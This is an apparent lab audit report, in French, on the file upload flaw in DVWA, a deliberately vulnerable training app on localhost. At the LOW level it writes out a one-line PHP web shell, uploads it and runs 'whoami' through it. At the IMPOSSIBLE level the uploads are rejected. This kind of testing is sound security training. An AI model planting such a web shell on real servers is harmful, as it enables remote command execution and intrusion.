
# File Upload - Rapport d'audit

**Catégorie OWASP Top 10** : A05:2021 - Security Misconfiguration
**Sévérité** : Élevée
**URL testée** : http://localhost/DVWA/vulnerabilities/upload/
**Date du test** : 07/07/2026

---

## Messages observés

**Succès** :
../../hackable/uploads/[fichier] succesfully uploaded!

**Échec** :
Your image was not uploaded. We can only accept JPEG or PNG images.

---

## Résultats des tests

### Niveau LOW

**Test 1 : Téléchargement d'un fichier PHP (shell.php)**
- Fichier : shell.php
- Contenu : `<?php system($_GET['cmd']); ?>`
- Résultat : ../../hackable/uploads/shell.php succesfully uploaded!

**Test 2 : Accès au fichier sans paramètre**
- URL : http://localhost/DVWA/hackable/uploads/shell.php
- Résultat : Erreur (paramètre cmd manquant)

**Test 3 : Exécution de commande (whoami)**
- URL : http://localhost/DVWA/hackable/uploads/shell.php?cmd=whoami
- Résultat : www-data

---

### Niveau IMPOSSIBLE

**Test 1 : Téléchargement d'une image normale**
- Fichier : test.jpg
- Résultat : (Your image was not uploaded. We can only accept JPEG or PNG images.

**Test 2 : Téléchargement d'un fichier PHP**
- Fichier : shell.php
- Résultat : Your image was not uploaded. We can only accept JPEG or PNG images.

---

